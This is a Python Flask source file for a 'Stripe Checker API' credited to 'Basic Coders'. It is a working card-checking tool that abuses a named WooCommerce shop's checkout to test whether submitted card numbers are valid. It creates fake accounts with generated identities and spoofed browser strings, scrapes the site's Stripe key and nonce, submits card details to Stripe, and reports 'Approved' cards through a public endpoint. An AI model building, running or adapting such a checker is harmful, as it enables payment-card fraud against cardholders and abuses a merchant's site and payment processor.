from flask import Flask, request
import requests
import re
import os
import json
import random
from faker import Faker
from bs4 import BeautifulSoup

app = Flask(__name__)
fake = Faker()
domain = "https://www.epicalarc.com"

def generate_user():
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
    password = fake.password(length=10, special_chars=True)
    return fname, lname, email, password

def register_user(session):
    fname, lname, email, password = generate_user()
    res = session.get(f"{domain}/my-account/")
    soup = BeautifulSoup(res.text, "html.parser")
    nonce = soup.find("input", {"name": "woocommerce-register-nonce"})["value"]
    referer = soup.find("input", {"name": "_wp_http_referer"})["value"]
    data = {
        "email": email,
        "password": password,
        "register": "Register",
        "woocommerce-register-nonce": nonce,
        "_wp_http_referer": referer,
    }
    headers = {
        "origin": domain,
        "referer": f"{domain}/my-account/",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": fake.user_agent(),
    }
    session.post(f"{domain}/my-account/", headers=headers, data=data)
    return session

def get_stripe_key_and_nonce(session):
    res = session.get(f"{domain}/my-account/add-payment-method/")
    html = res.text
    stripe_pk = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
    nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
    if not stripe_pk or not nonce:
        raise Exception("❌ Failed to extract stripe_pk or nonce")
    return stripe_pk.group(0), nonce.group(1)

def create_payment_method(stripe_pk, card, exp_month, exp_year, cvv):
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": fake.user_agent(),
    }
    data = {
        "type": "card",
        "card[number]": card,
        "card[cvc]": cvv,
        "card[exp_year]": exp_year[-2:],
        "card[exp_month]": exp_month,
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
        "key": stripe_pk,
        "_stripe_version": "2024-06-20",
    }
    r = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
    return r.json().get("id")

def confirm_setup(session, pm_id, nonce):
    headers = {
        "x-requested-with": "XMLHttpRequest",
        "origin": domain,
        "referer": f"{domain}/my-account/add-payment-method/",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": fake.user_agent(),
    }
    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }
    res = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers, data=data)
    return res.text

def start_checker(card_input):
    result_text = ""
    try:
        card, month, year, cvv = card_input.split("|")
        
        # Create session
        session = requests.Session()
        
        # Register user
        register_user(session)
        
        # Get Stripe key and nonce
        stripe_pk, nonce = get_stripe_key_and_nonce(session)
        
        # Create payment method
        pm_id = create_payment_method(stripe_pk, card, month, year, cvv)
        
        if not pm_id:
            result_text = "❌ Failed to create Payment Method"
        else:
            # Confirm setup
            result = confirm_setup(session, pm_id, nonce)
            
            try:
                rjson = json.loads(result)
                if rjson.get("success") and rjson["data"].get("status") == "succeeded":
                    setupintent = rjson["data"].get("id", "N/A")
                    result_text = f"""
Status :- Approved  
Setupintent :- {setupintent}  
Response :- Stripe Auth Passed ✅  
By :- Basic Coders
"""
                else:
                    result_text = result
            except:
                result_text = result
    
    except Exception as e:
        result_text = f"Error: {str(e)}"
    
    return result_text

@app.route('/ch', methods=['GET'])
def check_card():
    """API endpoint to check card - exact same logic as original script"""
    card_input = request.args.get('card')
    
    if not card_input:
        return """
Error: No card provided
Usage: /ch?card=nn|mm|yy|cvv
Example: /ch?card=4242424242424242|12|25|123
"""
    
    # Run the exact same checker logic
    result = start_checker(card_input)
    
    # Return plain text response
    return result

@app.route('/', methods=['GET'])
def home():
    """Simple homepage with instructions"""
    return """
<!DOCTYPE html>
<html>
<head>
    <title>Stripe Checker API</title>
    <style>
        body {
            font-family: monospace;
            background: black;
            color: lime;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            color: cyan;
            border-bottom: 1px solid lime;
        }
        code {
            background: #333;
            padding: 10px;
            display: block;
            margin: 10px 0;
            border-left: 3px solid cyan;
        }
        .success {
            color: lime;
        }
        .error {
            color: red;
        }
        .example {
            color: yellow;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Stripe Checker API</h1>
        
        <h2>📡 Endpoint:</h2>
        <code>GET /ch?card=nn|mm|yy|cvv</code>
        
        <h2>📝 Format:</h2>
        <p><span class="example">card_number|exp_month|exp_year|cvv</span></p>
        
        <h2>🎯 Example:</h2>
        <code>/ch?card=4242424242424242|12|25|123</code>
        
        <h2>✅ Test Cards:</h2>
        <code>4242424242424242|12|25|123</code>
        
        <h2>📊 Response:</h2>
        <pre>
Status :- Approved  
Setupintent :- seti_xxxxxxxxxxxx  
Response :- Stripe Auth Passed ✅  
By :- Basic Coders
        </pre>
        
        <h2>⚡ Usage:</h2>
        <code>curl "http://localhost:5000/ch?card=4242424242424242|12|25|123"</code>
        
        <h2>❓ Help:</h2>
        <p>Send GET request to <span class="example">/ch</span> with card parameter</p>
    </div>
</body>
</html>
"""

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║   Stripe Checker API - Basic Coders   ║
    ╚═══════════════════════════════════════╝
    
    🚀 Server started!
    
    📍 Endpoint: GET /ch?card=nn|mm|yy|cvv
    🌐 Homepage: http://localhost:5000
    
    📝 Example:
    http://localhost:5000/ch?card=4242424242424242|12|25|123
    
    🔧 By: Basic Coders
    """)
    
    # Run the app
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
